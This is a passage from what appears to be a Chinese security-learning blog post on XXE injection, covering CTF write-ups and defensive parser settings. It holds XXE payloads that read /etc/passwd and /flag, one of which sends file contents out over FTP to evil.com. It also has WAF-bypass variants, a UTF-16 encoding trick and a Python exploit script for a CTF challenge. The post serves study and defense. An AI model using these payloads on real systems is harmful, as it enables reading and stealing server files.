+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp:&#x2F;&#x2F;evil.com:8000&#x2F;%b;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容</p>
+<p>技巧来自：<a target="_blank" rel="noopener" href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></p>
+<h3 id="Bypass">Bypass</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;</span><br><span class="line">&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="XXE如何防御">XXE如何防御</h2>
+<p>1、使用开发语言提供的禁用外部实体的方法<br>
+php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
+<p>java:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure>
+<p>Python:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>
+<p>2、过滤用户提交的XML数据<br>
+过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。<br>
+3、不允许XML中含有自己定义的DTD</p>
+<h2 id="CTF中的XXE">CTF中的XXE</h2>
+<h3 id="api调用">api调用</h3>
+<p>题目地址：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226122019.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135052.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135232.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226135314.png" alt=""></p>
+<h3 id="Fake-XML-Cookbook">Fake XML Cookbook</h3>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<p>题目说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;Difficulty: easy&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">flag is in &#x2F;flag</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;Author zjy&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/php_xxe/doLogin.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,data=payload,headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>
+<h3 id="True-XML-cookbook">True XML cookbook</h3>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226154009.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153933.png" alt=""></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200226153418.png" alt=""></p>
+<h3 id="CSAWQual-2019-Web-Unagi">[CSAWQual 2019]Web_Unagi</h3>
+<p>使用utf-16编码绕过WAF上传xml文件读取flag</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;utf-16&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">username</span>&gt;</span>Bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span> <span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>utf-16编码</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104241.png" alt=""></p>
+<p>上传</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200916104413.png" style="zoom:67%;" />
+<h2 id="Update">Update</h2>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
+<p>无法引用外部DTD文件的前提下，无回显利用XXE注入：</p>
+<h3 id="引用内部实体">引用内部实体</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#39;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="三层嵌套">三层嵌套</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#39;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message</span><br></pre></td></tr></table></figure>
+<h2 id="Reference">Reference</h2>
+<p>xxe injector tool：<a target="_blank" rel="noopener" href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
+<p>XXE payload list：<a target="_blank" rel="noopener" href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://p0rz9.github.io/2019/02/27/xxe/">XXE漏洞总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://v0w.top/2019/01/20/XXE-note/#4-http%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">XXE学习笔记</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru">XXE实体注入</a></p>
+<p><a target="_blank" rel="noopener" href="http://gv7.me/articles/2018/think-about-blind-xxe-payload/">Blind XXE经典payload引发的脑洞</a></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-02-26</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>-><a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">#Web安全学习</a> <a class="tag-none-link" href="/tags/xxe%E6%BC%8F%E6%B4%9E/" rel="tag">#xxe漏洞</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
